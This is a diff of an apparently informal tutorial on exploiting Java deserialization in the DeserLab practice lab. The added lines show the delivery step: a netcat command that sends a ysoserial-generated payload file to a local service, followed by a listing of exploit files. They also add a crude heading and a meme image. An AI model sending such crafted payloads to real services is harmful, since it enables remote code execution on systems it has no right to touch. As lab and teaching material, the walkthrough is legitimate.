@@ -443,14 +443,18 @@ xxd ../DeserLab-v1.0/withpayload.bin
 
 ```
 
+OK now it the time for delivery.
 
+### Fuc*k off
+![ricky](https://raw.githubusercontent.com/punishell/DezerializationForDummies/master/fuckoff.png)
 
+```
+nc -nv 127.0.0.1 6666 < withpayload.bin
+ls
+DeserLab.jar  deserlab.pcap   lib  payload.bin  poc.txt  test.bin  withpayload.bin  ysoserial-master-SNAPSHOT.jar
+```
 
-
-
-
-
-
+Noice
 
 
 ps. almose everything here is ctrl+c strl+v but i did enjoy adding some TPB pictures and learn something :)
